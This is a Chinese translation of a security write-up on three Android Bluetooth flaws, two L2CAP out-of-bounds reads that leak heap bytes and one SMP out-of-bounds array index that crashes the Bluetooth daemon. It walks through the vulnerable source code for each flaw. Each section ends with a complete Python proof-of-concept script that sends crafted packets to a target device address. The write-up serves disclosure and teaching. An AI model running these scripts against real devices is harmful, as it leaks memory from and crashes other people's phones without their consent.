# 快速理解Android中的三个蓝牙漏洞

阅读量 **221638**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-08-25 10:00:04

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t0130946c6df484bf74.jpg)

> 两个内存泄漏和一个数组索引越界

## 漏洞简介

  * [Issue 74882215](https://issuetracker.google.com/issues/74882215): Bluetooth L2CAP L2CAP_CMD_CONN_REQ Remote Memory Disclosure（蓝牙L2CAP L2CAP_CMD_CONN_REQ远程内存泄漏）
  * [Issue 74889513](https://issuetracker.google.com/issues/74889513): Bluetooth L2CAP L2CAP_CMD_DISC_REQ Remote Memory Disclosure（蓝牙L2CAP L2CAP_CMD_DISC_REQ远程内存泄漏）
  * [Issue 74917004](https://issuetracker.google.com/issues/74917004): Bluetooth SMP smp_sm_event() OOB Array Indexing（蓝牙SMP smp_sm_event（）OOB数组索引）

## 漏洞1：Bluetooth L2CAP L2CAP_CMD_CONN_REQ Remote Memory Disclosure

`（蓝牙L2CAP L2CAP_CMD_CONN_REQ远程内存泄漏）`

###  简要

通过将巧尽心思构造的`L2CAP数据包`发送到目标设备，蓝牙范围内的远程攻击者可以利用Android蓝牙堆栈中的漏洞来泄露属于`com.android.bluetooth`守护程序堆的
**2个** 字节（一个uint16_t数据）。

###  前置介绍

####  L2CAP

L2CAP（Logical Link Control and Adaptation Protocol），即逻辑链路控制和适配协议

![](https://p0.ssl.qhimg.com/t011d38f36e7556be90.png)

【蓝牙架构中如图所示】

`L2CAP`是蓝牙协议栈中的一个协议。

功能包括 为更高层的协议传输数据、在单个链路上复用多个应用程序。

`L2CAP`是基于信道的，并且控制命令在预定义的`L2CAP_SIGNALLING_CID（0x01）`信道上发送。

###  漏洞详情

> 漏洞在于使用 `STREAM_TO_UINT16`宏而不检查攻击者控制的数据包中是否剩余了足够的数据。如果第二次使用
> `STREAM_TO_UINT16`时，数据包中没有剩余字节，那么将越界读取 `rcid`
>
> 结果：泄漏数据包后相邻的两个字节（rcid）

`L2CAP`传入的数据由`l2c_rcv_acl_data()`函数`[ platform / system / bt / stack / l2cap /
l2c_main.cc ]`处理。

如果传入的`L2CAP数据包`指定`L2CAP_SIGNALLING_CID`作为其目标通道，则`l2c_rcv_acl_data()`调用`process_l2cap_cmd()`函数来处理`L2CAP`控制命令。

以上过程如下所示：

![](https://p3.ssl.qhimg.com/t01e12fd724c6c28dc9.png)

`L2CAP_CMD_CONN_REQ`控制命令在`process_L2CAP_CMD()`函数中是这样处理的：

    
    
    case L2CAP_CMD_CONN_REQ:
      STREAM_TO_UINT16(con_info.psm, p);
      STREAM_TO_UINT16(rcid, p);
      p_rcb = l2cu_find_rcb_by_psm(con_info.psm);
      if (p_rcb == NULL) {
        L2CAP_TRACE_WARNING("L2CAP - rcvd conn req for unknown PSM: %d",
                            con_info.psm);
        l2cu_reject_connection(p_lcb, rcid, id, L2CAP_CONN_NO_PSM);
        break;
      } else {
      [...]
    

代码使用了两次`STREAM_TO_UINT16`宏`[ platform / system / bt / stack / include /
bt_types.h ]`，
从`L2CAP数据包`（上面的变量p，就是数据包中的数据）中一共读取2个`uint16_t`值（读入后分别放入了`con_info.psm`和`rcid`中）。

    
    
    #define STREAM_TO_UINT16(u16, p)                                  \
      {                                                               \
        (u16) = ((uint16_t)(*(p)) + (((uint16_t)(*((p) + 1))) << 8)); \
        (p) += 2;                                                     \
      }
    

漏洞在于使用`STREAM_TO_UINT16`宏而不检查攻击者控制的数据包中是否剩余了足够的数据。如果第二次使用`STREAM_TO_UINT16`时，数据包中没有剩余字节，那么将
**越界读取**`rcid`（也可能越界读取con_info.psm，只是后面不会泄漏出来），更确切地说，从堆上与数据包相邻的任何数据。之后，如果`l2cu_find_rcb_by_psm()`返回NULL，并且因此到达了`if`分支，则调用`l2cu_reject_connection()
[ stack / l2cap / l2c_utils.cc ]`将向远程对等方发送`rcid`，从而有效地从堆中泄漏了2个字节：

    
    
    void l2cu_reject_connection(tL2C_LCB* p_lcb, uint16_t remote_cid,
                                uint8_t rem_id, uint16_t result) {
      [...]
      UINT16_TO_STREAM(p, 0); /* Local CID of 0   */
      UINT16_TO_STREAM(p, remote_cid);
      UINT16_TO_STREAM(p, result);
      UINT16_TO_STREAM(p, 0); /* Status of 0      */
      l2c_link_check_send_pkts(p_lcb, NULL, p_buf);
    }
    

请注意，攻击者可以通过在特制的`L2CAP数据包`中提供
**未注册的协议/服务多路复用器**`（PSM）`ID字段来完全影响`l2cu_find_rcb_by_psm()`，以致于始终返回NULL（从而始终到达`if`分支）。

另外，请注意，这种使用`STREAM_TO_UINT16`宏而不检查攻击者控制的数据包中是否剩余足够数据的不安全代码模式似乎已在`process_l2cap_cmd()`函数的各处使用。

* * *

总结来说，过程如下图所示：

![](https://p2.ssl.qhimg.com/t01c8826dbb889f955b.png)

从堆栈上通过函数`STREAM_TO_UINT16`分别读取两字节到`con_info.psm`和`rcid`，`con_info.psm`再通过函数`l2cu_find_rcd_by_psm`函数得到`p_rcb`，对`p_rcb`进行判断，如果`p_rcb
== NULL`（可以通过提供未注册的协议/服务多路复用器ID字段来实现），会读取`rcid`等信息。

如果，数据包中的数据在`数据1..`就已经结束，程序还是会将堆栈上将相邻两个字节的数据（也就是`数据2..`）读入到rcid，最后发送给远程对等方。那么，最后整个攻击结果就是这里的内存泄漏了两个字节。

###  Proof-of-Concept（概念验证）

以下Python代码触发了该漏洞，并打印了从目标蓝牙设备的`com.android.bluetooth`守护程序堆泄漏的16位值。

此Python代码使用`Blueborne框架`中的`l2cap_infra包`。

用法：`$ sudo python l2cap01.py <src-hci > <target-bdaddr>`。

例如：`$ sudo python l2cap01.py hci0 00：11：22：33：44：55`。

    
    
    import os
    import sys
    from l2cap_infra import *
    
    L2CAP_SIGNALLING_CID = 0x01
    L2CAP_CMD_CONN_REQ = 0x02
    
    
    def main(src_hci, dst_bdaddr):
        l2cap_loop, _ = create_l2cap_connection(src_hci, dst_bdaddr)
    
        # This will leak 2 bytes from the heap 这将从堆中泄漏2个字节
        print "Sending L2CAP_CMD_CONN_REQ in L2CAP connection..." #发送L2CAP连接中的L2CAP命令连接请求
        cmd_code = L2CAP_CMD_CONN_REQ
        cmd_id = 0x41               # not important
        cmd_len = 0x00              # bypasses this check at lines 296/297 of l2c_main.cc:   p_next_cmd = p + cmd_len; / if (p_next_cmd > p_pkt_end) {
        non_existent_psm = 0x3333   # Non-existent Protocol/Service Multiplexer id, so l2cu_find_rcb_by_psm() returns NULL and l2cu_reject_connection() is called 协议/服务多路复用器id不存在，因此l2cu_find_rcb_by_psm()返回NULL，并调用l2cu_reject_connection（）
    
        # here we use L2CAP_SIGNALLING_CID as cid, so l2c_rcv_acl_data() calls process_l2cap_cmd():
        #这里我们将L2CAP_signaling_CID用作CID，因此l2c_rcv_acl_data()调用进程_L2CAP_cmd()：
        # 170    /* Send the data through the channel state machine 通过通道状态机发送数据*/
        # 171    if (rcv_cid == L2CAP_SIGNALLING_CID) {
        # 172      process_l2cap_cmd(p_lcb, p, l2cap_len);
        l2cap_loop.send(L2CAP_Hdr(cid=L2CAP_SIGNALLING_CID) / Raw(struct.pack('<BBHH', cmd_code, cmd_id, cmd_len, non_existent_psm)))
        l2cap_loop.on(lambda pkt: True,
                      lambda loop, pkt: pkt)
    
        # And printing the returned data.打印返回的数据。 
        pkt = l2cap_loop.cont()[0]
        print "Response: %s\n" % repr(pkt)
        # print "Packet layers: %s" % pkt.summary()
        # The response packet contains 3 layers: L2CAP_Hdr / L2CAP_CmdHdr / L2CAP_ConnResp
        # The response contains 1 leaked word in the 'scid' field of the L2CAP_ConnResp layer 响应在L2CAP_conresp层的“scid”字段中包含1个泄漏的单词
        print "Leaked word: 0x%04x" % pkt[2].scid
    
        l2cap_loop.finish()
    
    if __name__ == '__main__':
        if len(sys.argv) < 2:
            print("Usage: l2cap01.py <src-hci> <dst-bdaddr>")
        else:
            if os.getuid():
                print "Error: This script must be run as root."
            else:
                main(*sys.argv[1:])
    

## 漏洞2：Bluetooth L2CAP L2CAP_CMD_DISC_REQ Remote Memory Disclosure

`蓝牙L2CAP L2CAP_CMD_DISC_REQ远程内存泄露`

###  简要

通过将特制的`L2CAP数据包`发送到目标设备，蓝牙范围内的远程攻击者可以使用Android
蓝牙堆栈中的漏洞来泄露属于`com.android.bluetooth`守护程序堆的4个字节。

###  漏洞详情

> 漏洞在于，两次使用了`STREAM_TO_UINT16` 宏，而没有检查攻击者控制的数据包中是否至少还有4个字节。如果数据包中没有剩余字节，则越界读取
> `lcid` 和 `rcid`。
>
> 结果：泄漏数据包后相邻的四个字节

`L2CAP_CMD_DISC_REQ`控制命令在`process_L2CAP_CMD()`函数中是这样处理的：

    
    
    case L2CAP_CMD_DISC_REQ:
      STREAM_TO_UINT16(lcid, p);
      STREAM_TO_UINT16(rcid, p);
      p_ccb = l2cu_find_ccb_by_cid(p_lcb, lcid);
      if (p_ccb != NULL) {
        if (p_ccb->remote_cid == rcid) {
          p_ccb->remote_id = id;
          l2c_csm_execute(p_ccb, L2CEVT_L2CAP_DISCONNECT_REQ, &con_info);
        }
      } else
        l2cu_send_peer_disc_rsp(p_lcb, id, lcid, rcid);
    

上面的代码两次使用`STREAM_TO_UINT16`宏[ `platform / system / bt / stack / include /
bt_types.h` ] ，从`L2CAP数据包`中一共读取2个`uint16_t`值（`lcid`和`rcid`）：

漏洞在于，两次使用了`STREAM_TO_UINT16`宏，而没有检查攻击者控制的数据包中是否至少还有4个字节。如果数据包中没有剩余字节，则越界读取`lcid`和`rcid`，更准确地说，从堆上与数据包数据相邻的任何数据读取。之后，如果`l2cu_find_ccb_by_cid()`返回NULL并因此到达else分支，则调用`l2cu_send_peer_disc_rsp()
[ platform / system / bt / stack / l2cap / l2c_utils.cc
]`向远程对等方发送`lcid`和`rcid`，有效地从堆中泄漏了4个字节：

    
    
    void l2cu_send_peer_disc_rsp(tL2C_LCB* p_lcb, uint8_t remote_id,
                                 uint16_t local_cid, uint16_t remote_cid) {
    [...]
      UINT16_TO_STREAM(p, local_cid);
      UINT16_TO_STREAM(p, remote_cid);
      l2c_link_check_send_pkts(p_lcb, NULL, p_buf);
    }
    

请注意，攻击者可能会完全影响`l2cu_find_ccb_by_cid()`来返回NULL（并因此到达else分支），因为除非在目标蓝牙设备和攻击者的蓝牙设备之间使用虚假`lcid`设置了活动的信道控制块`（CCB）`，否则该函数将始终返回NULL。

图示如下：

![](https://p4.ssl.qhimg.com/t017074af04ab105ca1.png)

从堆栈上通过函数`STREAM_TO_UINT16`分别读取两字节到`lcid`和`rcid`，`con_info.psm`再通过函数`l2cu_find_ccd_by_cid`函数得到`p_ccb`，对`p_ccb`进行判断，如果`p_ccb
== NULL`（通过在目标蓝牙之间使用的虚拟lcid不设置活动的信道控制块来实现），然后就会像远程对等方发送lcid和rcid等信息。

如果，数据包中的数据在`数据1..`之前就已经结束，程序还是会将堆栈上将相邻四个字节的数据（也就是`数据2..`）分别读入到`lcid`和`rcid`，最后发送给远程对等方。那么，最后整个攻击结果就是这里的内存泄漏了四个字节。

###  Proof-of-Concept（概念验证）

以下Python代码触发了该漏洞，并打印了从目标蓝牙设备的`com.android.bluetooth`守护程序堆泄漏的两个16位值。

此Python代码使用`Blueborne框架`中的`l2cap_infra包`。

用法： `$ sudo python l2cap02.py <src- hci > <target-bdaddr>`。

例如：`$ sudo python l2cap02.py hci0 00：11：22：33：44：55`。

    
    
    import os
    import sys
    from l2cap_infra import *
    
    L2CAP_SIGNALLING_CID = 0x01
    L2CAP_CMD_DISC_REQ = 0x06
    
    
    def main(src_hci, dst_bdaddr):
        l2cap_loop, _ = create_l2cap_connection(src_hci, dst_bdaddr)
    
        # This will leak 4 bytes from the heap 这将从堆中泄漏4个字节
        print "Sending L2CAP_CMD_DISC_REQ command in L2CAP connection..."
        cmd_code = L2CAP_CMD_DISC_REQ
        cmd_id = 0x41               # not important
        cmd_len = 0x00              # bypasses this check at lines 296/297 of l2c_main.cc:   p_next_cmd = p + cmd_len; / if (p_next_cmd > p_pkt_end) {
    
        # here we use L2CAP_SIGNALLING_CID as cid, so l2c_rcv_acl_data() calls process_l2cap_cmd():
        #这里我们将L2CAP_signaling_CID用作CID，因此l2c_rcv_acl_data（）调用进程_L2CAP_cmd（）：
        # 170    /* Send the data through the channel state machine */
        # 171    if (rcv_cid == L2CAP_SIGNALLING_CID) {
        # 172      process_l2cap_cmd(p_lcb, p, l2cap_len);
        l2cap_loop.send(L2CAP_Hdr(cid=L2CAP_SIGNALLING_CID) / Raw(struct.pack('<BBH', cmd_code, cmd_id, cmd_len)))
        l2cap_loop.on(lambda pkt: True,
                      lambda loop, pkt: pkt)
    
        # And printing the returned data.并打印返回的数据。
        pkt = l2cap_loop.cont()[0]
        print "Response: %s\n" % repr(pkt)
        # print "Packet layers: %s" % pkt.summary()
        # The response packet contains 3 layers: L2CAP_Hdr / L2CAP_CmdHdr / L2CAP_DisconnResp
        # The response contains 2 leaked words in the 'dcid' and 'scid' fields of the L2CAP_DisconnResp layer
        print "Leaked words: 0x%04x 0x%04x" % (pkt[2].dcid, pkt[2].scid)
    
        l2cap_loop.finish()
    
    
    if __name__ == '__main__':
        if len(sys.argv) < 2:
            print("Usage: l2cap02.py <src-hci> <dst-bdaddr>")
        else:
            if os.getuid():
                print "Error: This script must be run as root."
            else:
                main(*sys.argv[1:])
    

## 漏洞3：Bluetooth SMP smp_sm_event() OOB Array Indexing

`Bluetooth SMP smp_sm_event() OOB阵列索引`

###  简要

蓝牙范围内的远程攻击者可以使用Android
蓝牙堆栈中的漏洞，通过以意外传输方式将包含`SMP_OPCODE_PAIRING_REQ`命令的`SMP`数据包发送到目标设备，从而使`com.android.bluetooth`守护程序访问其边界之外的数组。

###  前置介绍

####  安全管理协议SMP

SMP（The Security Manager Protocol ）

连接建立之后，双方通过某些方式协商共同的密钥，然后将后续要传输的数据用这个密钥通过加密算法进行加密，然后发送。接收方，接收到这些数据后，必须使用正确的密钥来解密，才能得到正确的数据了。接着，建立密钥，即完成双方密钥协商，就密钥一事达成共同一致的过程。

过程如图所示：

![](https://p1.ssl.qhimg.com/t0169cb00d339ddfb35.png)

> 为运行在低功耗蓝牙协议栈上的应用程序提供诸如身份验证，设备授权和数据隐私等服务的权限。

###  漏洞详情

> 数组索引只接受0x0和0x1，而作为索引的变量还能设置为0xff，导致后续引用可能导致分段错误

`SMP协议`通过预定义的`L2CAP_SMP_CID（0x06）`通道，位于`L2CAP`之上。

传入的`SMP数据包`由`smp_data_received()`函数`[ platform / system / bt / stack / smp /
smp_l2c.cc ]`处理。如果 通过包含`SMP_OPCODE_PAIRING_REQ（0x01）`命令的`L2CAP_SMP_CID`固定通道
接收到输入`SMP`数据包，则将到达以下代码：

    
    
    static void smp_data_received(uint16_t channel, const RawAddress& bd_addr,
                                  BT_HDR* p_buf) {
      [...]
      /* reject the pairing request if there is an on-going SMP pairing */
      if (SMP_OPCODE_PAIRING_REQ == cmd || SMP_OPCODE_SEC_REQ == cmd) {
        if ((p_cb->state == SMP_STATE_IDLE) &&
            (p_cb->br_state == SMP_BR_STATE_IDLE) &&
            !(p_cb->flags & SMP_PAIR_FLAGS_WE_STARTED_DD)) {
          p_cb->role = L2CA_GetBleConnRole(bd_addr);
      [...]
    

如上面的代码所示，最后一行中`p_cb-> role`设置为`L2CA_GetBleConnRole（bd_addr）`返回的值。`p_cb->
role`应该保存以下值之一[ `platform / system / bt / stack / include / hcidefs.h` ]，也就是
p_cb->role的值可以是0x00、0x01、0xff

    
    
    /* HCI role defenitions */
    #define HCI_ROLE_MASTER 0x00
    #define HCI_ROLE_SLAVE 0x01
    #define HCI_ROLE_UNKNOWN 0xff
    

如果我们查看`L2CA_GetBleConnRole()`函数的代码`[ platform / system / bt / stack / l2cap /
l2c_ble.cc ]`，我们可以看到它调用了`l2cu_find_lcb_by_bd_addr()`为了查找活跃的链接控制块（an active
Link Control
Block）`（LCB）`结构匹配远程`BDADDR`并且使用低能耗传输`（BT_TRANSPORT_LE）`；如果找不到它，则返回`HCI_ROLE_UNKNOWN（0xff）`。当我们通过`BR/EDR`（基本速率/增强数据速率，也称为“经典”蓝牙）传输发送包含`SMP_OPCODE_PAIRING_REQ`命令的`SMP`数据包时，这种情况会发生，因为它只适用于低能量（LE）传输：

    
    
    uint8_t L2CA_GetBleConnRole(const RawAddress& bd_addr) {
      uint8_t role = HCI_ROLE_UNKNOWN;
      tL2C_LCB* p_lcb;
      p_lcb = l2cu_find_lcb_by_bd_addr(bd_addr, BT_TRANSPORT_LE);
      if (p_lcb != NULL) role = p_lcb->link_role;
      return role;
    }
    

因此，回到`smp_data_received()`函数，将`p_cb->
role`设置为`HCI_ROLE_UNKNOWN（0xff）`之后，它调用`smp_sm_event()` [ `platform / system /
bt / stack / smp / smp_main.cc` ]，我们到达以下代码：

    
    
    953  void smp_sm_event(tSMP_CB* p_cb, tSMP_EVENT event,      tSMP_INT_DATA* p_data) {
                            ...
    957    tSMP_ENTRY_TBL entry_table = smp_entry_table[p_cb->role];
                            ...
    970    /* look up the state table for the current state */
    971    /* lookup entry /w event & curr_state */
    972    /* If entry is ignore, return.
    973     * Otherwise, get state table (according to curr_state or          all_state) */
    974    if ((event <= SMP_MAX_EVT) &&
    975        ((entry = entry_table[event - 1][curr_state]) != SMP_SM_IGNORE)) {
    

在957行，代码使用`p_cb-> role`作为索引从`smp_entry_table`静态数组中读取，而无需检查`p_cb->
role`是否具有两个有效值之一（`HCI_ROLE_MASTER（0x00）`或`HCI_ROLE_SLAVE（0x01）`）。这就是漏洞所在：`smp_entry_table`静态数组仅包含2个元素，而`p_cb->
role的`值为`0xFF`，是在通过`BR /
EDR`传输接收到包含`SMP_OPCODE_PAIRING_REQ`命令的`SMP`数据包之后，而不是通过预期的低能耗传输：

    
    
    static const tSMP_ENTRY_TBL smp_entry_table[] = {smp_master_entry_map,
                                                     smp_slave_entry_map};
    

因此，由于执行`entry_table = smp_entry_table
[0xff]`时的OOB索引，`entry_table`局部变量将包含一些垃圾值（无论是否在`bluetooth.default.so`二进制数据的`smp_entry_table`全局变量之后）。因此，稍后，在第975行，当取消引用`entry_table
[event- 1]
[curr_state]`时，很可能会导致分段错误（受特定版本的`bluetooth.default.so`二进制文件的影响，`smp_entry_table`全局变量位于该二进制文件中）），这将使`com.android.bluetooth`守护程序停止工作。

* * *

总结来说，过程如下图所示：

![](https://p5.ssl.qhimg.com/t013052c59a694b2b2a.png)

文中提及的函数调用关系：

![](https://p4.ssl.qhimg.com/t0130548eef7f7eae09.png)

【箭头指向表示调用该函数】

理论上讲，如果能够找到了一个版本的`bluetooth.default.so`，取消引用`entry_table [event-1]
[curr_state]`，那么程序就不会崩溃，可以进一步解决此错误。

###  Proof-of-Concept（概念验证）

以下Python代码触发了该漏洞，并且很有可能使目标设备上的`com.android.bluetooth`守护程序崩溃。

此Python代码使用Blueborne框架中的[l2cap_infra](https://github.com/ArmisSecurity/blueborne/tree/master/l2cap_infra)包。

用法： `$ sudo python smp01.py <src- hci > <target-bdaddr>`。

例如：`$ sudo python smp01.py hci0 00：11：22：33：44：55`。

    
    
    import os
    import sys
    from l2cap_infra import *
    
    
    L2CAP_SMP_CID = 0x06
    # This matches the CID used in l2cap_infra to establish a successful connection.
    OUR_LOCAL_SCID = 0x40
    SMP_OPCODE_PAIRING_REQ = 0x01
    
    
    
    def main(src_hci, dst_bdaddr):
        l2cap_loop, _ = create_l2cap_connection(src_hci, dst_bdaddr)
    
        print "Sending SMP_OPCODE_PAIRING_REQ in L2CAP connection..."
        cmd_code = SMP_OPCODE_PAIRING_REQ
        the_id = 0x41       # not important
        cmd_len = 0x08
        flags = 0x4142      # not important
    
    
        # here we use L2CAP_SMP_CID as cid
        l2cap_loop.send(L2CAP_Hdr(cid=L2CAP_SMP_CID) / Raw(struct.pack('<BBHHH', cmd_code, the_id, cmd_len, OUR_LOCAL_SCID, flags)))
        l2cap_loop.finish()
        print "The com.android.bluetooth daemon should have crashed."
    
    if __name__ == '__main__':
        if len(sys.argv) < 2:
            print("Usage: smp01.py <src-hci> <dst-bdaddr>")
        else:
            if os.getuid():
                print "Error: This script must be run as root."
            else:
                main(*sys.argv[1:])
    

## 结论

漏洞2和漏洞1思想本质上是一致的。

  * 相同点：都因为`STREAM_TO_UINT16`宏没有对读入数据进行检验，是否到达数据包中还有足够的数据，导致越界读取，最后泄漏内存数据。
  * 不同点：在绕过前面判断后 到达的泄漏函数，漏洞1只向远程对等方法送了第二个从数据包那块读入的uint16_t数据；而漏洞2则向远程对等放发送了两个从数据包那块读入的uint16_t的数据，所以漏洞1可以泄漏2两个字节，漏洞2可以泄漏4个字节

前两个漏洞会影响处理L2CAP协议的代码，并且它们允许远程攻击者（在蓝牙范围内）泄漏属于`com.android.bluetooth`进程的内存内容。这些内存泄露漏洞可能对
**漏洞利用链的早期阶段** 的攻击者有所帮助，甚至可以用来 **检索敏感数据** 。

第三个漏洞是SMP协议实现中的 **越界数组索引错误** ，尽管最有可能使`com.android.bluetooth` **进程崩溃**
，但仍有可能利用它在易受攻击的Android设备上远程执行代码。有趣的是，与两个L2CAP问题不同，此SMP错误并不是解析格式错误的数据包的结果。实际上，可以通过发送格式
**正确的SMP数据包** （包含`SMP_OPCODE_PAIRING_REQ`）来触发它，但是要是通过 **BR / EDR（“经典”蓝牙）传输**
而不是预期的 **BLE（低能耗）传输** 来触发。

总的来说，虽然是两类漏洞，但是问题起因都在于代码上的检验不够完整导致的，使得程序执行到了非预期的情况。

## 参考

<https://blog.quarkslab.com/a-story-about-three-bluetooth-vulnerabilities-in-android.html>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **b00k** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/215179](/post/id/215179)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [无线安全](/tag/无线安全)
  * [蓝牙](/tag/蓝牙)

 **+1** __1赞

 __收藏

![](https://p0.ssl.qhimg.com/t016c95a48ca48d062d.png) b00k

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

